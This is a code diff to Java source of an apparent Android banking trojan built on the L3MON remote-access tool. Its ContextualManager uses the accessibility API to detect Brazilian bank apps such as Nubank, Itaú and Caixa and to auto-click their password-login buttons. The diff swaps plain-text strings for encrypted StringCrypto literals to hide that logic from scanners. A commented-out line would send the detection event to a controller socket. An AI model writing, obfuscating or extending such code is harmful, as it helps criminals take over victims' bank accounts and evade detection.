@@ -1,9 +1,13 @@
 package com.etechd.l3mon.managers;
 
 import android.view.accessibility.AccessibilityNodeInfo;
+
 import org.json.JSONObject;
+
 import java.util.HashMap;
 import java.util.Map;
+
+import com.etechd.l3mon.StringCrypto;
 
 public class ContextualManager {
 
@@ -39,6 +43,7 @@ public class ContextualManager {
     public void onBankDetected(String bankName, AccessibilityNodeInfo root) {
         if (bankName == null || root == null)
             return;
+
         if (bankName.equals(lastDetectedBank))
             return;
 
@@ -46,31 +51,35 @@ public class ContextualManager {
 
         try {
             JSONObject event = new JSONObject();
-            event.put("action", "bank_detected");
-            event.put("bank", bankName.toUpperCase());
-            event.put("timestamp", System.currentTimeMillis());
+            event.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), StringCrypto.d("d/eGSd5QYxzZj6vlGx+6ig==")); // "action"
+                                                                                                               // =
+                                                                                                               // "bank_detected"
+            event.put(StringCrypto.d("bftMHTJO9AYrI3XBQoExcQ=="), bankName.toUpperCase()); // "bank"
+            event.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis()); // "timestamp"
 
             // ConnectionManager.ioSocket.emit("0xCTX", event);
 
             // Ações automáticas por banco
             switch (bankName.toLowerCase()) {
                 case "nubank":
-                    clickIfExists(root, "entrar com senha");
-                    clickIfExists(root, "usar senha");
+                    clickIfExists(root, StringCrypto.d("+PtDcsiwOR2Tel6NTfcgGg2mX9fmfdmvTpbvcYiXm+I=")); // "entrar com
+                                                                                                         // senha"
+                    clickIfExists(root, StringCrypto.d("WzcU0njwTz+jAMiX2Ey3uA==")); // "usar senha"
                     break;
                 case "itau":
-                    clickIfExists(root, "acessar com senha");
-                    clickIfExists(root, "continuar");
+                    clickIfExists(root, StringCrypto.d("7jEzGOjPomwHFzqpMNZnz5rpvYMvyZZA1L+hUkpCcJU=")); // "acessar com
+                                                                                                         // senha"
+                    clickIfExists(root, StringCrypto.d("0piUixy2F5VQ0vJknn1RFA==")); // "continuar"
                     break;
                 case "bradesco":
                 case "caixa":
                 case "bb":
-                    clickIfExists(root, "acessar");
-                    clickIfExists(root, "entrar");
+                    clickIfExists(root, StringCrypto.d("SdyeS2SaRafXFzbikNohYg==")); // "acessar"
+                    clickIfExists(root, StringCrypto.d("QGMA95k6dCUrXjAbRENt9Q==")); // "entrar"
                     break;
                 default:
-                    clickIfExists(root, "entrar");
-                    clickIfExists(root, "acessar");
+                    clickIfExists(root, StringCrypto.d("QGMA95k6dCUrXjAbRENt9Q==")); // "entrar"
+                    clickIfExists(root, StringCrypto.d("SdyeS2SaRafXFzbikNohYg==")); // "acessar"
                     break;
             }
         } catch (Exception e) {
